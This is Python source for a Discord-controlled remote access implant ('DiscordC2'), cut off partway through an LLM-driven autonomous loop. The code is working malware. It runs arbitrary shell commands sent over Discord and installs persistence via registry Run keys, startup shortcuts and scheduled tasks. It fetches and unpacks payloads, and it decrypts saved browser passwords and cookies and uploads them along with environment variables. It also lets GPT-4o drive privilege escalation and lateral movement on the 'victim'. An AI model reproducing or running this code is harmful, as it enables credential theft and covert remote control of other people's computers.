# --- Discord and OpenAI API Keys ---
BOT_TOKEN = ""
OPENAI_API_KEY = ""
# --- Required Imports ---

import os
import Crypto
import re
import shlex
import subprocess
import getpass
from urllib.parse import unquote, urlsplit
import discord
import asyncio
import random
import platform
import uuid
import time
import datetime
import json
import ctypes


INSTANCE_MUTEX_HANDLE = None

def get_cached_id_path():
    base_dir = os.environ.get("LOCALAPPDATA") or os.environ.get("APPDATA") or os.path.expanduser("~")
    return os.path.join(base_dir, "ART", "machine-id.txt")


def load_cached_id():
    try:
        with open(get_cached_id_path(), "r", encoding="utf-8") as file_handle:
            cached_id = file_handle.read().strip()
            if cached_id:
                return cached_id
    except OSError:
        pass
    return None


def store_cached_id(machine_id):
    try:
        cache_path = get_cached_id_path()
        os.makedirs(os.path.dirname(cache_path), exist_ok=True)
        with open(cache_path, "w", encoding="utf-8") as file_handle:
            file_handle.write(machine_id)
    except OSError:
        pass


def get_windows_machine_guid():
    if os.name != "nt":
        return None
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as key_handle:
            machine_guid, _ = winreg.QueryValueEx(key_handle, "MachineGuid")
            machine_guid = str(machine_guid).strip().lower()
            if machine_guid:
                return machine_guid
    except OSError:
        pass
    return None


def get_unique_id():
    machine_guid = get_windows_machine_guid()
    if machine_guid:
        return machine_guid
    try:
        import uuid as uuidlib
        mac = uuidlib.getnode()
        if not ((mac >> 40) % 2):
            return hex(mac)[2:]
    except Exception:
        pass

    cached_id = load_cached_id()
    if cached_id:
        return cached_id

    generated_id = str(uuid.uuid4())
    store_cached_id(generated_id)
    return generated_id


def acquire_single_instance_guard():
    global INSTANCE_MUTEX_HANDLE
    if os.name != "nt":
        return True
    try:
        kernel32 = ctypes.windll.kernel32
        mutex_name = f"Local\\ART-{get_unique_id()}"
        handle = kernel32.CreateMutexW(None, False, mutex_name)
        if not handle:
            return True
        INSTANCE_MUTEX_HANDLE = handle
        if kernel32.GetLastError() == 183:
            return False
        return True
    except Exception:
        return True

def get_hostname():
    try:
        return platform.node()
    except Exception:
        return os.environ.get("COMPUTERNAME", "unknown-host")


def get_current_user():
    try:
        return getpass.getuser()
    except Exception:
        return os.environ.get("USERNAME") or os.environ.get("USER") or "unknown-user"


def configure_windows_event_loop_policy():
    if os.name != "nt":
        return
    selector_policy = getattr(asyncio, "WindowsSelectorEventLoopPolicy", None)
    if selector_policy is not None:
        asyncio.set_event_loop_policy(selector_policy())



class DiscordC2(discord.Client):
    async def _run_shell_command(self, command):
        def _run():
            completed = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                cwd=self.current_dir,
            )
            return (completed.stdout + completed.stderr).decode("utf-8", errors="replace")

        return await asyncio.to_thread(_run)

    async def _write_text_file(self, path, content):
        def _write():
            with open(path, "w", encoding="utf-8") as file_handle:
                file_handle.write(content)

        await asyncio.to_thread(_write)

    async def _remove_file_if_exists(self, path):
        def _remove():
            if os.path.exists(path):
                os.remove(path)

        await asyncio.to_thread(_remove)

    async def on_message(self, message):
        # Ignore messages from self
        if message.author == self.user:
            return
        # Only process commands in the agent's command channel
        if hasattr(self, 'channel') and message.channel.id != self.channel.id:
            return
        content = message.content.strip()
        cmd = content.lower()
        self.last_heartbeat = time.time()

        def strip_outer_quotes(value):
            if len(value) >= 2 and value[0] == value[-1] and value[0] in ('"', "'"):
                return value[1:-1]
            return value

        # Recognize !report and !abort regardless of case/whitespace
        if cmd == "!report":
            await self.generate_and_upload_report(message.channel)
            return
        if cmd == "!abort":
            await message.channel.send("[mode] Aborting autonomous mode and switching to passive. Generating report...")
            self.mode = "passive"
            await self.generate_and_upload_report(message.channel)
            return
        # Mode switching
        if cmd.startswith("!mode"):
            arg = cmd[5:].strip().lower()
            if arg == "passive":
                if self.mode == "passive":
                    await message.channel.send("🟢 Agent is already in **Passive Mode**.")
                else:
                    self.mode = "passive"
                    await message.channel.send("🟢 Agent switched to **Passive Mode**. Awaiting human commands.")
                    await self.global_logs_channel.send(f"[mode] {self.hostname}: Switched to Passive Mode.")
                    await self.generate_and_upload_report(message.channel)
                return
            elif arg == "active":
                if self.mode == "active":
                    await message.channel.send("🟢 Agent is already in **Autonomous (Active) Mode**.")
                else:
                    self.mode = "active"
                    await message.channel.send("🟢 Agent switched to **Autonomous (Active) Mode**. LLM now in control.")
                    await self.global_logs_channel.send(f"[mode] {self.hostname}: Switched to Autonomous (Active) Mode.")
                    asyncio.create_task(self.start_autonomous_loop())
                return
        # --- Persistence Command ---
        if cmd.startswith("!persist"):
            import sys
            args = content[8:].strip().lower()
            exe_path = os.path.abspath(sys.argv[0])
            results = []
            if "setup" in args or not args:
                ok, msg = self.setup_registry_run_key(exe_path)
                results.append(msg)
                if not ok:
                    ok2, msg2 = self.setup_startup_shortcut(exe_path)
                    results.append(msg2)
                ok3, msg3 = self.setup_schtask(exe_path)
                results.append(msg3)
                await message.channel.send("\n".join(results))
                await self.global_logs_channel.send(f"[persist] {self.hostname}: {'; '.join(results)}")
                return
            if "cleanup" in args:
                ok, msg = self.cleanup_registry_run_key()
                results.append(msg)
                ok2, msg2 = self.cleanup_startup_shortcut()
                results.append(msg2)
                ok3, msg3 = self.cleanup_schtask()
                results.append(msg3)
                await message.channel.send("\n".join(results))
                await self.global_logs_channel.send(f"[persist-cleanup] {self.hostname}: {'; '.join(results)}")
                return
        # !help command
        if cmd.startswith("!help"):
            args = content.split()
            subcmd = args[1].lower() if len(args) > 1 else None
            if not subcmd:
                help_text = (
                    """
**General Commands:**
    • `!help` — Show this help menu
    • `!help <command>` — Show help for a specific command
   
    • `!mode active` — Start autonomous mode and hand control to the LLM
    • `!mode passive` — Return to passive mode and generate a report when leaving active mode
    • `!report` — Generate the current assessment report and upload it to #reports
    • `!abort` — Stop autonomous mode, switch to passive mode, and generate a report
    • `!message <text>` — Show a message box on victim
    • `!ls [path]` — List directory contents
    • `!cd [path]` — Change current directory
    • `!download [path]` — Download a file from the victim
    • `!upload <url|filename> [dest]` — Download from URL or retrieve from #payloads
    • `!upload --zip <archive.zip> [dest]` — Retrieve a zip payload and extract it after download
    • `!upload --b64 <payload.b64> [dest]` — Retrieve a base64 payload and decode it after download
    • `!delete <path>` — Delete a file on the victim
    • `!dump [type]` — Collect browser passwords, cookies, and environment loot (types: password, cookie, env, all)
    • `!shell <command>` — Run a system shell command and return output
    • Any other text — Executed as a shell command in the agent's current directory

**Persistence & OPSEC:**
    • `!persist [setup|cleanup]` — Setup or remove persistence
        - Registry Run Key, Startup Shortcut, Scheduled Task
        - `!persist setup` — Apply all methods (default)
        - `!persist cleanup` — Remove all persistence for OPSEC

**Autonomous Workflow:**
    - `!report` works on demand while an assessment is running
    - `!abort` stops autonomous execution and pushes the report immediately
    - Reports are uploaded to #reports

**Notes:**
    - All actions and command results are logged to #global-logs
    - Commands are only processed in this agent's assigned command channel
    - Use `!help` at any time to display this menu
"""
                )
                await message.channel.send(help_text)
                return
            # Detailed help for specific commands
            command_help = {
                "help": "`!help [command]` — Show this help menu or details for a specific command.",
                "report": "`!report` — Generate the current assessment report and upload it to #reports.",
                "abort": "`!abort` — Stop autonomous mode, switch to passive mode, and generate a report.",
                "mode": "`!mode active|passive` — Switch between autonomous (active) and passive modes.",
                "message": "`!message <text>` — Show a message box on the victim's screen.",
                "ls": "`!ls [path]` — List directory contents. Defaults to current directory if no path is given.",
                "cd": "`!cd [path]` — Change the current working directory.",
                "download": "`!download [path]` — Download a file from the victim machine.",
                "upload": (
                    "`!upload [--zip|--b64] <url|filename> [dest]` — Transfer a payload to the victim.\n"
                    "Modes:\n"
                    "  default — Download from a URL or retrieve an exact file from #payloads\n"
                    "  --zip — Retrieve a `.zip` payload, then extract it after download\n"
                    "  --b64 — Retrieve a `.b64` or `.base64` payload, then decode it after download"
                ),
                "delete": "`!delete <path>` — Delete a file on the victim machine.",
                "dump": (
                    "`!dump [type]` — Collect offensive security loot.\n"
                    "Types:\n"
                    "  password — Only dump browser-saved passwords\n"
                    "  cookie — Only dump browser cookies\n"
                    "  env — Only dump environment variables\n"
                    "  all — Dump everything (default if no type given)"
                ),
                "shell": "`!shell <command>` — Run a system shell command and return the output.",
                "persist": (
                    "`!persist [setup|cleanup]` — Setup or remove persistence.\n"
                    "  setup — Apply all methods (default)\n"
                    "  cleanup — Remove all persistence for OPSEC"
                ),
            }
            key = subcmd.strip("!")
            msg = command_help.get(key)
            if msg:
                await message.channel.send(f"**Help for `{subcmd}`:**\n{msg}")
            else:
                await message.channel.send(f"No detailed help available for `{subcmd}`.")
            return
        # !dump command
        if cmd.startswith("!dump"):
            args = content.split()
            subcmd = args[1].lower() if len(args) > 1 else "all"
            await message.channel.send(f"[dump] Collecting: {subcmd}")
            loot_files = []
            errors = []
            wants_passwords = subcmd in ("all", "password", "passwords")
            wants_cookies = subcmd in ("all", "cookie", "cookies")

            # Browser passwords and cookies
            if wants_passwords or wants_cookies:
                try:
                    import shutil
                    import glob
                    import base64
                    import json as js
                    import win32crypt
                    from Crypto.Cipher import AES
                    import sqlite3
                    user_dir = os.environ.get("USERPROFILE") or os.path.expanduser("~")
                    chromium_browsers = [
                        ("Chrome", os.path.join(user_dir, r"AppData\Local\Google\Chrome\User Data")),
                        ("Edge", os.path.join(user_dir, r"AppData\Local\Microsoft\Edge\User Data")),
                        ("Brave", os.path.join(user_dir, r"AppData\Local\BraveSoftware\Brave-Browser\User Data")),
                        ("Opera", os.path.join(user_dir, r"AppData\Roaming\Opera Software\Opera Stable")),
                        ("OperaGX", os.path.join(user_dir, r"AppData\Roaming\Opera Software\Opera GX Stable")),
                        ("Vivaldi", os.path.join(user_dir, r"AppData\Local\Vivaldi\User Data")),
                    ]
                    for browser, base_path in chromium_browsers:
                        local_state_path = os.path.join(base_path, "Local State")
                        # Try all profiles in the browser's user data dir
                        if os.path.exists(base_path):
                            profiles = ["Default"]
                            try:
                                profiles += [d for d in os.listdir(base_path) if d.startswith("Profile ")]
                            except Exception:
                                pass
                            for profile in profiles:
                                # --- Passwords ---
                                login_db = os.path.join(base_path, profile, "Login Data")
                                if wants_passwords and os.path.exists(login_db) and os.path.exists(local_state_path):
                                    loot_path = os.path.join(self.current_dir, f"{browser}_{profile}_passwords.json")
                                    try:
                                        shutil.copy2(login_db, "login_db_copy")
                                        with open(local_state_path, "r", encoding="utf-8") as f:
                                            local_state = js.load(f)
                                        key_b64 = local_state["os_crypt"]["encrypted_key"]
                                        key = base64.b64decode(key_b64)[5:]
                                        master_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                                        conn = sqlite3.connect("login_db_copy")
                                        cursor = conn.cursor()
                                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                                        loot_data = []
                                        for row in cursor.fetchall():
                                            url, username, encrypted = row
                                            if encrypted[:3] == b'v10':
                                                iv = encrypted[3:15]
                                                payload = encrypted[15:]
                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                                try:
                                                    decrypted = cipher.decrypt(payload)[:-16].decode()
                                                except Exception:
                                                    decrypted = "[decryption failed]"
                                            else:
                                                try:
                                                    decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
                                                except Exception:
                                                    decrypted = "[decryption failed]"
                                            loot_data.append({"url": url, "user": username, "pass": decrypted})
                                        with open(loot_path, "w", encoding="utf-8") as loot:
                                            js.dump(loot_data, loot, indent=2)
                                        conn.close()
                                        loot_files.append(loot_path)
                                    finally:
                                        try:
                                            os.remove("login_db_copy")
                                        except Exception:
                                            pass
                                # --- Cookies ---
                                cookie_candidates = [
                                    os.path.join(base_path, profile, "Network", "Cookies"),
                                    os.path.join(base_path, profile, "Cookies"),
                                ]
                                if profile == "Default":
                                    cookie_candidates.extend([
                                        os.path.join(base_path, "Network", "Cookies"),
                                        os.path.join(base_path, "Cookies"),
                                    ])
                                cookies_db = next((path for path in cookie_candidates if os.path.exists(path)), None)
                                if wants_cookies and cookies_db and os.path.exists(local_state_path):
                                    cookies_loot_path = os.path.join(self.current_dir, f"{browser}_{profile}_cookies.json")
                                    try:
                                        shutil.copy2(cookies_db, "cookies_db_copy")
                                        with open(local_state_path, "r", encoding="utf-8") as f:
                                            local_state = js.load(f)
                                        key_b64 = local_state["os_crypt"]["encrypted_key"]
                                        key = base64.b64decode(key_b64)[5:]
                                        master_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                                        conn = sqlite3.connect("cookies_db_copy")
                                        cursor = conn.cursor()
                                        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly, last_access_utc FROM cookies")
                                        cookies = []
                                        for row in cursor.fetchall():
                                            host, name, path, encrypted, expires, secure, httponly, last_access = row
                                            if encrypted[:3] == b'v10':
                                                iv = encrypted[3:15]
                                                payload = encrypted[15:]
                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                                try:
                                                    value = cipher.decrypt(payload)[:-16].decode()
                                                except Exception:
                                                    value = "[decryption failed]"
                                            else:
                                                try:
                                                    value = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
                                                except Exception:
                                                    value = "[decryption failed]"
                                            cookies.append({
                                                "browser": browser,
                                                "profile": profile,
                                                "host": host,
                                                "name": name,
                                                "path": path,
                                                "value": value,
                                                "expires_utc": expires,
                                                "is_secure": bool(secure),
                                                "is_httponly": bool(httponly),
                                                "last_access_utc": last_access
                                            })
                                        with open(cookies_loot_path, "w", encoding="utf-8") as loot:
                                            js.dump(cookies, loot, indent=2)
                                        conn.close()
                                        loot_files.append(cookies_loot_path)
                                    finally:
                                        try:
                                            os.remove("cookies_db_copy")
                                        except Exception:
                                            pass
                    # Firefox: just copy logins.json (decryption is more complex)
                    ff_profiles = glob.glob(os.path.join(user_dir, r"AppData\Roaming\Mozilla\Firefox\Profiles\*"))
                    for prof in ff_profiles:
                        logins = os.path.join(prof, "logins.json")
                        if wants_passwords and os.path.exists(logins):
                            loot_path = os.path.join(self.current_dir, os.path.basename(prof) + "_logins.json")
                            shutil.copy2(logins, loot_path)
                            loot_files.append(loot_path)
                        # --- Firefox cookies ---
                        cookies_sqlite = os.path.join(prof, "cookies.sqlite")
                        if wants_cookies and os.path.exists(cookies_sqlite):
                            cookies_loot_path = os.path.join(self.current_dir, os.path.basename(prof) + "_cookies.json")
                            try:
                                shutil.copy2(cookies_sqlite, "ff_cookies_db_copy")
                                conn = sqlite3.connect("ff_cookies_db_copy")
                                cursor = conn.cursor()
                                cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly, lastAccessed FROM moz_cookies")
                                cookies = []
                                for row in cursor.fetchall():
                                    host, name, value, path, expiry, secure, httponly, last_access = row
                                    cookies.append({
                                        "browser": "Firefox",
                                        "profile": os.path.basename(prof),
                                        "host": host,
                                        "name": name,
                                        "path": path,
                                        "value": value,
                                        "expires_utc": expiry,
                                        "is_secure": bool(secure),
                                        "is_httponly": bool(httponly),
                                        "last_access_utc": last_access
                                    })
                                with open(cookies_loot_path, "w", encoding="utf-8") as loot:
                                    js.dump(cookies, loot, indent=2)
                                conn.close()
                                loot_files.append(cookies_loot_path)
                            finally:
                                try:
                                    os.remove("ff_cookies_db_copy")
                                except Exception:
                                    pass
                except Exception as e:
                    errors.append(f"Browser loot error: {e}")
            # Environment variables
            if subcmd in ("all", "env", "envs", "envvar", "envvars"):
                try:
                    env_out = os.path.join(self.current_dir, "env_vars.json")
                    with open(env_out, "w", encoding="utf-8") as f:
                        import json as js
                        js.dump(dict(os.environ), f, indent=2)
                    loot_files.append(env_out)
                except Exception as e:
                    errors.append(f"Env var dump error: {e}")
            # Send loot files
            if loot_files:
                sent_any = False
                for fpath in loot_files:
                    try:
                        await message.channel.send(file=discord.File(fpath))
                        await self.global_logs_channel.send(f"[dump] {self.hostname}: Sent loot file {fpath}")
                        sent_any = True
                    except Exception as e:
                        errors.append(f"Send file error ({fpath}): {e}")
                    finally:
                        # Remove all loot files after upload attempt (OPSEC: nothing left behind)
                        try:
                            if os.path.exists(fpath):
                                os.remove(fpath)
                        except Exception:
                            pass
                if not sent_any:
                    await message.channel.send("[dump] No loot files could be sent (none found or all failed).")
                elif errors:
                    await message.channel.send("[dump] Some errors occurred:\n" + "\n".join(errors))
                    await self.global_logs_channel.send(f"[dump] {self.hostname}: Errors: {'; '.join(errors)}")
                else:
                    await message.channel.send("[dump] Complete. All loot sent.")
            else:
                await message.channel.send("[dump] No loot files found for this command.")
            return
        # !shell command
        if cmd.startswith("!shell "):
            shell_cmd = content[7:].strip()
            if not shell_cmd:
                await message.channel.send("❌ Usage: !shell <command>")
                return
            try:
                import subprocess
                result = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True, cwd=self.current_dir)
                output = result.stdout.strip() + ("\n" + result.stderr.strip() if result.stderr.strip() else "")
                if not output:
                    output = "[Command executed with no output]"
                if len(output) > 1900:
                    out_file = os.path.join(self.current_dir, "shell_output.txt")
                    with open(out_file, "w", encoding="utf-8") as f:
                        f.write(output)
                    await message.channel.send("📄 Output too large, attached as file:", file=discord.File(out_file))
                    await self.global_logs_channel.send(f"[shell] {self.hostname}: Output too large, sent as file.")
                    try:
                        os.remove(out_file)
                    except Exception:
                        pass
                else:
                    await message.channel.send(f"```\n{output}\n```")
                    await self.global_logs_channel.send(f"[shell] {self.hostname}: {shell_cmd}\n{output}")
            except Exception as e:
                await message.channel.send(f"❌ Shell execution error: {e}")
                await self.global_logs_channel.send(f"[shell] {self.hostname}: Shell execution error: {e}")
            return
        # !message command (show message box)
        if cmd.startswith("!message"):
            msg = content[8:].strip()
            if not msg:
                await message.channel.send("❌ Usage: !message <text>")
                return
            try:
                import platform
                if platform.system() == "Windows":
                    import ctypes
                    ctypes.windll.user32.MessageBoxW(0, msg, "Message from Admin", 0)
                elif platform.system() == "Darwin":
                    subprocess.run(
                        ["osascript", "-e", f'display dialog {json.dumps(msg)} with title "Message from Admin"'],
                        check=False,
                    )
                else:
                    subprocess.Popen(
                        ["zenity", "--info", f"--text={msg}", "--title=Message from Admin"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                await message.channel.send(f"✅ Message box displayed.")
            except Exception as e:
                await message.channel.send(f"❌ Could not display message box: {e}")
            return
        # !delete command
        if cmd.startswith("!delete"):
            path = strip_outer_quotes(content[7:].strip())
            if not path:
                await message.channel.send("❌ Usage: !delete <path to file>")
                return
            try:
                os.remove(path)
                await message.channel.send(f"✅ File deleted: `{path}`")
                await self.global_logs_channel.send(f"[delete] {self.hostname}: Deleted `{path}`")
            except Exception as e:
                await message.channel.send(f"❌ Delete error: {e}")
                await self.global_logs_channel.send(f"[delete] {self.hostname}: Delete error: {e}")
            return
        # !ls command
        if cmd.startswith("!ls"):
            path = strip_outer_quotes(content[3:].strip()) or self.current_dir
            try:
                files = os.listdir(path)
                listing = "\n".join(files)
                msg = f"**Directory listing for `{path}`:**\n```\n{listing}\n```"
                if len(msg) > 1900:
                    out_file = os.path.join(self.current_dir, "ls_output.txt")
                    with open(out_file, "w", encoding="utf-8") as file_handle:
                        file_handle.write(listing)
                    await message.channel.send(f"📄 Directory listing for `{path}` is too large, attached as file:", file=discord.File(out_file))
                    await self.global_logs_channel.send(f"[ls] {self.hostname}: Output too large for `{path}`, sent as file.")
                    try:
                        os.remove(out_file)
                    except Exception:
                        pass
                else:
                    await message.channel.send(msg)
                    await self.global_logs_channel.send(f"[ls] {self.hostname}: {msg}")
            except Exception as e:
                await message.channel.send(f"❌ ls error: {e}")
                await self.global_logs_channel.send(f"[ls] {self.hostname}: ❌ ls error: {e}")
            return
        # !cd command
        if cmd.startswith("!cd"):
            path = strip_outer_quotes(content[3:].strip())
            if not path:
                await message.channel.send(f"Current directory: `{self.current_dir}`")
                await self.global_logs_channel.send(f"[cd] {self.hostname}: Current directory: `{self.current_dir}`")
                return
            try:
                os.chdir(path)
                self.current_dir = os.getcwd()
                await message.channel.send(f"✅ Changed directory to `{self.current_dir}`")
                await self.global_logs_channel.send(f"[cd] {self.hostname}: Changed directory to `{self.current_dir}`")
            except Exception as e:
                await message.channel.send(f"❌ cd error: {e}")
                await self.global_logs_channel.send(f"[cd] {self.hostname}: ❌ cd error: {e}")
            return
        # !download command
        if cmd.startswith("!download"):
            path = strip_outer_quotes(content[9:].strip())
            if not path:
                await message.channel.send("❌ Usage: !download [path]")
                await self.global_logs_channel.send(f"[download] {self.hostname}: Usage error")
                return
            if not os.path.isfile(path):
                await message.channel.send(f"❌ File not found: `{path}`")
                await self.global_logs_channel.send(f"[download] {self.hostname}: File not found: `{path}`")
                return
            try:
                await message.channel.send(f"📥 Downloading `{path}`:", file=discord.File(path))
                await self.global_logs_channel.send(f"[download] {self.hostname}: Downloaded `{path}`")
                await self.intel_channel.send(f"[download] {self.hostname}: {path}", file=discord.File(path))
            except Exception as e:
                await message.channel.send(f"❌ Download error: {e}")
                await self.global_logs_channel.send(f"[download] {self.hostname}: Download error: {e}")
            return
        # !upload command with --zip and --b64 support
        if cmd.startswith("!upload "):
            import base64
            import zipfile
            arg = content[8:].strip()
            parts = [part.strip('"') for part in shlex.split(arg, posix=False)]
            if not parts:
                await message.channel.send("❌ Usage: !upload [--zip|--b64] <filename or url> [destination_path]")
                return
            flag = None
            if parts[0] in ("--zip", "--b64"):
                flag = parts[0]
                parts = parts[1:]
            if not parts:
                await message.channel.send("❌ Usage: !upload [--zip|--b64] <filename or url> [destination_path]")
                return
            src = parts[0]
            dest_path = parts[1] if len(parts) > 1 else None
            if not dest_path:
                downloads_dir = os.path.join(os.path.expanduser("~"), "Downloads")
                if not os.path.isdir(downloads_dir):
                    try:
                        os.makedirs(downloads_dir, exist_ok=True)
                    except Exception:
                        downloads_dir = self.current_dir
                dest_path = downloads_dir
            def resolve_output_path(target_path, source_name):
                explicit_dir = target_path.endswith((os.sep, "/")) or (os.altsep and target_path.endswith(os.altsep))
                if os.path.isabs(target_path):
                    return os.path.join(target_path, source_name) if explicit_dir or os.path.isdir(target_path) else target_path
                abs_dest = os.path.join(self.current_dir, target_path)
                return os.path.join(abs_dest, source_name) if explicit_dir or os.path.isdir(abs_dest) else abs_dest

            def ensure_parent_dir(file_path):
                parent_dir = os.path.dirname(file_path)
                if parent_dir:
                    os.makedirs(parent_dir, exist_ok=True)

            def decoded_output_name(source_name):
                if source_name.lower().endswith(".b64"):
                    return source_name[:-4]
                if source_name.lower().endswith(".base64"):
                    return source_name[:-7]
                return source_name + ".decoded"

            # Download from URL
            if re.match(r"https?://", src):
                url_parts = urlsplit(src)
                filename = os.path.basename(unquote(url_parts.path)) or "downloaded_payload.bin"
                filepath = resolve_output_path(dest_path, filename)
                try:
                    import requests
                    r = requests.get(src, allow_redirects=True, timeout=30)
                    r.raise_for_status()
                    ensure_parent_dir(filepath)
                    with open(filepath, "wb") as f:
                        f.write(r.content)
                    if flag == "--zip":
                        with zipfile.ZipFile(filepath, "r") as zipf:
                            zipf.extractall(os.path.dirname(filepath))
                        os.remove(filepath)
                        await message.channel.send(f"✅ File `{filename}` downloaded from {src} and extracted to `{os.path.dirname(filepath)}`")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Downloaded `{filename}` from {src} and extracted to `{os.path.dirname(filepath)}`")
                    elif flag == "--b64":
                        decoded_path = os.path.join(os.path.dirname(filepath), decoded_output_name(filename))
                        with open(filepath, "rb") as f_in, open(decoded_path, "wb") as f_out:
                            base64.decode(f_in, f_out)
                        os.remove(filepath)
                        await message.channel.send(f"✅ File `{filename}` downloaded from {src} and decoded to `{decoded_path}`")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Downloaded `{filename}` from {src} and decoded to `{decoded_path}`")
                    else:
                        await message.channel.send(f"✅ File `{filename}` downloaded from {src} to `{filepath}`")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Downloaded `{filename}` from {src} to `{filepath}`")
                except Exception as e:
                    await message.channel.send(f"❌ Upload failed: {e}")
                    await self.global_logs_channel.send(f"[upload] {self.hostname}: Upload failed: {e}")
                return
            filename = src
            filepath = resolve_output_path(dest_path, filename)
            try:
                ensure_parent_dir(filepath)
                found = False
                async for msg in self.payload_channel.history(limit=100):
                    for att in msg.attachments:
                        if att.filename == filename:
                            await att.save(filepath)
                            found = True
                            break
                    if found:
                        break
                if not found:
                    await message.channel.send(f"❌ File `{filename}` not found in #payloads.")
                    await self.global_logs_channel.send(f"[upload] {self.hostname}: `{filename}` not found in #payloads.")
                    return
                # Decompress or decode if needed
                if flag == "--zip":
                    try:
                        with zipfile.ZipFile(filepath, "r") as zipf:
                            zipf.extractall(os.path.dirname(filepath))
                        await message.channel.send(f"✅ File `{filename}` retrieved from #payloads and extracted to `{os.path.dirname(filepath)}`.")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Retrieved `{filename}` from #payloads and extracted to `{os.path.dirname(filepath)}`.")
                        os.remove(filepath)
                    except Exception as e:
                        await message.channel.send(f"❌ Zip extraction failed: {e}")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Zip extraction failed: {e}")
                elif flag == "--b64":
                    try:
                        decoded_path = os.path.join(os.path.dirname(filepath), decoded_output_name(filename))
                        with open(filepath, "rb") as f_in, open(decoded_path, "wb") as f_out:
                            base64.decode(f_in, f_out)
                        await message.channel.send(f"✅ File `{filename}` retrieved from #payloads and decoded to `{decoded_path}`.")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Retrieved `{filename}` from #payloads and decoded to `{decoded_path}`.")
                        os.remove(filepath)
                    except Exception as e:
                        await message.channel.send(f"❌ Base64 decode failed: {e}")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Base64 decode failed: {e}")
                else:
                    await message.channel.send(f"✅ File `{filename}` retrieved from #payloads to `{filepath}`.")
                    await self.global_logs_channel.send(f"[upload] {self.hostname}: Retrieved `{filename}` from #payloads to `{filepath}`.")
            except Exception as e:
                await message.channel.send(f"❌ Upload failed: {e}")
                await self.global_logs_channel.send(f"[upload] {self.hostname}: Upload failed: {e}")
            return
        # Default: execute as shell command
        try:
            result = await self._run_shell_command(content)
            if len(result) > 1900:
                await self._write_text_file("out.txt", result)
                await message.channel.send("📄 Output too large, attached as file:", file=discord.File("out.txt"))
                await self.global_logs_channel.send(f"[cmd] {self.hostname}: Output too large, sent as file.")
                await self._remove_file_if_exists("out.txt")
            else:
                await message.channel.send(f"```\n{result or '[Command executed with no output]'}\n```")
                await self.global_logs_channel.send(f"[cmd] {self.hostname}: {content}\n{result}")
        except Exception as e:
            await message.channel.send(f"❌ Execution Error: {e}")
            await self.global_logs_channel.send(f"[cmd] {self.hostname}: Execution Error: {e}")

    async def _create_chat_completion(self, client, **kwargs):
        return await asyncio.to_thread(client.chat.completions.create, **kwargs)

    async def generate_and_upload_report(self, reply_channel):
        import openai
        import aiofiles
        client = openai.OpenAI(api_key=OPENAI_API_KEY)
        context = getattr(self, "_latest_context", None)
        if not context:
            await reply_channel.send("No assessment context available yet.")
            return
        report_prompt = f"""You are an elite Senior Penetration Tester following the PTES methodology. Generate a comprehensive PTES assessment report in Markdown format based on the current context below. The report should be suitable for delivery to a client and include all relevant findings, actions, and recommendations. Do not include any text outside the markdown report itself.\n\nContext:\n{context}"""
        try:
            response = await self._create_chat_completion(
                client,
                model="gpt-4o",
                messages=[{"role": "system", "content": report_prompt}]
            )
            report_markdown = response.choices[0].message.content.strip()
        except Exception as e:
            await reply_channel.send(f"[report] LLM error generating report: {e}")
            return
        report_filename = "Report.md"
        async with aiofiles.open(report_filename, "w", encoding="utf-8") as f:
            await f.write(report_markdown)
        # Always upload to the reports channel
        report_channel = getattr(self, "reports_channel", None)
        import discord as _discord
        if report_channel:
            await report_channel.send("PTES Assessment Report (on-demand):", file=_discord.File(report_filename))
            await reply_channel.send("[report] Report uploaded to #reports.")
        else:
            await reply_channel.send("[report] Could not find #reports channel. Report not uploaded.")
        try:
            os.remove(report_filename)
        except Exception as e:
            await reply_channel.send(f"[report] Failed to delete report file: {e}")

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.unique_id = get_unique_id()
        self.hostname = get_hostname()
        self.channel = None
        self.category = None
        self.last_heartbeat = time.time()
        self.heartbeat_task = None
        self.current_dir = os.path.dirname(os.path.abspath(__file__))
        self.mode = "passive"  # Modes: "passive" (default), "active"
        self._latest_context = {
            "phase": "Intelligence Gathering",
            "system_info": {
                "hostname": self.hostname,
                "os": f"{platform.system()} {platform.release()}",
                "user": get_current_user(),
                "current_dir": self.current_dir,
                "unique_id": self.unique_id,
            },
            "user_privileges": None,
            "network": {},
            "credentials": [],
            "vulnerabilities": [],
            "discovered_files": [],
            "objectives": ["privilege escalation", "persistence", "lateral movement", "data access"],
            "actions_taken": [],
        }

    async def start_autonomous_loop(self):
        # Store context for on-demand reporting
        import openai
        client = openai.OpenAI(api_key=OPENAI_API_KEY)
        logchan = self.art_log_channel or self.global_logs_channel
        await logchan.send(f"[autonomous] {self.hostname}: Autonomous loop started.")

        # Initialize context object
        context = getattr(self, "_latest_context", None) or {
            "phase": "Intelligence Gathering",
            "system_info": {
                "hostname": self.hostname,
                "os": f"{platform.system()} {platform.release()}",
                "user": get_current_user(),
                "current_dir": self.current_dir,
                "unique_id": self.unique_id,
            },
            "user_privileges": None,
            "network": {},
            "credentials": [],
            "vulnerabilities": [],
            "discovered_files": [],
            "objectives": ["privilege escalation", "persistence", "lateral movement", "data access"],
            "actions_taken": [],
        }
        history = []
        step = 1
        while self.mode == "active":
            self._latest_context = context
            # Build strict PTES prompt, always including the latest command output/result
            last_result = context["actions_taken"][-1]["result"] if context["actions_taken"] else ""
